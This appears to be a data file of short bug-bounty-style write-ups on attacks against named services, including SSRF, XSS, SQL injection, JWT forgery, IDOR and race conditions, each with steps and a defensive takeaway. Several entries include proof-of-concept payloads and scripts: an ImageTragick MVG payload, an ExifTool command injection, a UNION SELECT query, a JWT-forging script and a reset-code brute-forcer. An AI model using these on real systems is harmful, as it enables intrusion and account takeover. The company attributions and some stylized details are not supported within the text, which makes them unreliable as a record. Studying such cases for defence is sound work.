title: Shopify Admin Account Takeover via SSRF
summary: SSRF in webhook functionality allowed reading internal cloud metadata, leading to full admin account takeover via leaked AWS credentials.
steps: 1. Create a webhook with URL pointing to http://169.254.169.254/latest/meta-data/iam/security-credentials/
2. Trigger the webhook via order creation
3. Capture AWS IAM credentials from webhook response
4. Use credentials to access internal S3 buckets
5. Extract admin session tokens from config files
impact: Full admin account takeover, access to all merchant data
takeaway: Always validate and restrict outbound URLs. Block cloud metadata endpoints.

title: GitLab RCE via Exiftool Metadata Parsing
summary: Uploading a specially crafted DjVu file triggered a command injection vulnerability in ExifTool's metadata parser, achieving remote code execution.
steps: 1. Craft a DjVu file with malicious metadata using exiftool
2. Upload the file to a GitLab issue comment
3. GitLab's image processing pipeline invokes exiftool
4. Command injection triggers in metadata parsing
5. Reverse shell established as git user
impact: Full server compromise, source code access, CI/CD pipeline manipulation
takeaway: Sanitize all file uploads. Run image processing in sandboxed environments.
poc_code:
# Craft malicious DjVu file
exiftool -Comment='(metadata "\nid" . "\n")' image.djvu

# Upload via GitLab API
curl -X POST 'https://gitlab.com/api/v4/projects/1/uploads' -F 'file=@image.djvu'

title: Facebook OAuth Token Theft via Open Redirect
summary: Chaining an open redirect in Facebook's login flow with a crafted redirect_uri allowed stealing OAuth access tokens by redirecting users to an attacker-controlled domain.
steps: 1. Find open redirect on Facebook subdomain (apps.facebook.com/redirect?url=)
2. Register OAuth app with redirect_uri matching the vulnerable subdomain
3. Craft authorization URL with redirect through the open redirect
4. Victim clicks link and authorizes
5. Token is sent to attacker's server via redirect chain
impact: Account takeover via stolen OAuth tokens
takeaway: Strictly validate redirect_uri against whitelist. Don't allow open redirects near OAuth flows.

title: Uber Subdomain Takeover via Dangling CNAME
summary: A forgotten CNAME record pointing to an unclaimed Heroku app allowed complete takeover of saostatic.uber.com, enabling cookie theft and phishing.
steps: 1. Enumerate Uber subdomains using subfinder
2. Check CNAME records for dangling references
3. Found saostatic.uber.com -> unclaimed.herokuapp.com
4. Register the Herokuapp app with matching name
5. Serve phishing page or steal cookies via parent domain
impact: Cookie theft for uber.com, credential phishing
takeaway: Audit DNS records regularly. Remove CNAME records when decommissioning services.
poc_code:
# Enumerate subdomains
subfinder -d uber.com -o subs.txt

# Check for dangling CNAMEs
while read sub; do
  cname=$(dig +short CNAME $sub)
  if [ ! -z "$cname" ]; then
    echo "$sub -> $cname"
  fi
done < subs.txt

title: Twitter XSS via Unicode Normalization
summary: Unicode normalization differences between input validation and rendering allowed bypassing XSS filters. Fullwidth characters were normalized to ASCII after validation.
steps: 1. Identify that Twitter normalizes Unicode after sanitization
2. Craft XSS payload using fullwidth characters (＜ → <)
3. Input passes validation as non-dangerous Unicode
4. Browser normalizes to ASCII, executing JavaScript
5. Stored XSS triggers for all users viewing the tweet
impact: Session hijacking, account takeover via stored XSS
takeaway: Apply sanitization AFTER Unicode normalization, not before.

title: GitHub Enterprise SQL Injection
summary: SQL injection in GitHub Enterprise Server's search functionality allowed extracting private repository data and user credentials.
steps: 1. Navigate to repository code search
2. Inject SQL payload in search query parameter
3. Use UNION SELECT to enumerate database schema
4. Extract user email addresses and password hashes
5. Dump private repository metadata
impact: Access to all private repositories and user credentials
takeaway: Use parameterized queries everywhere. Never trust search inputs.
poc_code: GET /search?q=' UNION SELECT username,password_hash FROM users--&type=code

title: Slack IDOR Exposing Private Channels
summary: Predictable channel IDs in the Slack API allowed unauthorized access to private channel messages by incrementing numeric identifiers.
steps: 1. Create a private channel and note the channel ID
2. Observe channel IDs are sequential
3. Decrement/increment channel ID in API request
4. Access messages from other private channels
5. Enumerate accessible channels systematically
impact: Read-only access to private channel messages across workspace
takeaway: Use UUIDs instead of sequential IDs. Implement authorization checks on every API endpoint.

title: Shopify GraphQL Race Condition
summary: Race condition in Shopify's discount code application allowed applying the same code multiple times concurrently, stacking discounts beyond limits.
steps: 1. Add items to cart on Shopify store
2. Apply discount code SAVE50
3. Immediately send 10 concurrent requests to apply same code
4. Multiple applications succeed due to race condition
5. Cart total reduced by 500% (free items)
impact: Financial loss for merchants due to unlimited discount stacking
takeaway: Use database-level locking for state-changing operations. Implement idempotency keys.
poc_code:
# Send 10 concurrent discount applications
for i in $(seq 1 10); do
  curl -X POST 'https://store.myshopify.com/cart/apply_discount' \
    -d 'discount=SAVE50' &
done
wait

title: HackerOne CSRF Invite Hijacking
summary: CSRF vulnerability in HackerOne's team invitation flow allowed an attacker to add themselves to any private bug bounty program.
steps: 1. Register HackerOne account as attacker
2. Discover that team invite acceptance lacks CSRF token
3. Craft malicious page with auto-submitting form
4. Form submits invite acceptance to target program
5. Attacker gains access to private program
impact: Unauthorized access to private bug bounty programs and their reports
takeaway: Always require CSRF tokens for state-changing operations, even in invitation flows.

title: Yahoo RCE via ImageMagick
summary: ImageMagick vulnerability (ImageTragick CVE-2016-3714) in Yahoo's image processing allowed remote code execution by uploading a crafted SVG file.
steps: 1. Identify image upload functionality on Yahoo Mail
2. Craft malicious MVG/SVG file exploiting ImageMagick
3. Upload the file as email attachment preview
4. Server-side ImageMagick processes the file
5. Command injection executes via delegate processing
impact: Full server RCE, lateral movement within Yahoo infrastructure
takeaway: Disable vulnerable ImageMagick delegates. Use policy.xml to restrict operations.
poc_code:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id > /tmp/rce")'
pop graphic-context

title: Google Cloud Metadata SSRF via PDF Generator
summary: PDF export feature using headless Chrome was vulnerable to SSRF. Injecting a redirect in HTML content caused Chrome to fetch internal cloud metadata.
steps: 1. Find PDF export functionality that renders HTML
2. Inject HTML with meta refresh to cloud metadata URL
3. PDF generator follows redirect to 169.254.169.254
4. Cloud metadata rendered in PDF output
5. Extract service account tokens from metadata
impact: Access to internal Google Cloud resources via stolen service account
takeaway: Sandbox PDF rendering. Block internal network access from renderer.

title: Uber JWT Key Confusion Attack
summary: JWT verification accepted both RSA and HMAC algorithms. By changing alg to HS256 and signing with the RSA public key, attacker forged valid admin JWTs.
steps: 1. Intercept JWT from Uber's API
2. Extract the RSA public key from /.well-known/jwks.json
3. Change JWT header algorithm from RS256 to HS256
4. Modify payload claims (e.g., role: admin)
5. Sign the token using RSA public key as HMAC secret
impact: Privilege escalation to admin on internal tools
takeaway: Explicitly whitelist allowed JWT algorithms. Never accept HS256 when expecting RS256.
poc_code:
import jwt, json

public_key = open('uber_public.pem').read()
payload = {'user': 'attacker', 'role': 'admin'}
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)

title: Dropbox XXE via SVG Upload
summary: SVG file upload in Dropbox processed XML entities, allowing an attacker to read local files from the server via out-of-band XXE.
steps: 1. Craft SVG file with XXE payload
2. Upload SVG to Dropbox shared folder
3. Server parses SVG XML, processes external entities
4. File contents sent to attacker-controlled server via OOB
5. Extract /etc/passwd, AWS credentials, etc.
impact: Server-side file read, potential credential exposure
takeaway: Disable DTD processing for all XML parsers. Sanitize SVG uploads.

title: Airbnb Account Takeover via Password Reset
summary: Password reset token was brute-forceable due to insufficient entropy (4-digit code) and no rate limiting on verification endpoint.
steps: 1. Request password reset for victim email
2. Observe 4-digit verification code sent
3. Brute force all 10,000 combinations on /verify endpoint
4. No rate limiting allows full enumeration in ~30 seconds
5. Successfully reset victim's password
impact: Complete account takeover for any Airbnb user
takeaway: Use high-entropy tokens (128-bit+). Implement strict rate limiting on verification endpoints.
poc_code:
import requests
import concurrent.futures

def try_code(code):
    r = requests.post('https://airbnb.com/api/v2/verify_code',
                      json={'email': 'victim@email.com', 'code': f'{code:04d}'})
    if 'success' in r.text:
        print(f'[+] Valid code: {code:04d}')

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
    ex.map(try_code, range(10000))

title: Tesla API Privilege Escalation
summary: Tesla's vehicle API lacked proper authorization checks, allowing any authenticated user to send commands (unlock, drive) to other users' vehicles via IDOR.
steps: 1. Authenticate to Tesla API with own account
2. Capture vehicle command API request
3. Replace vehicle_id with another user's vehicle ID
4. Send unlock/honk/climate commands
5. Commands execute on victim's vehicle
impact: Physical safety risk - unauthorized control of vehicles
takeaway: Implement resource-level authorization. Verify ownership for every sensitive operation.
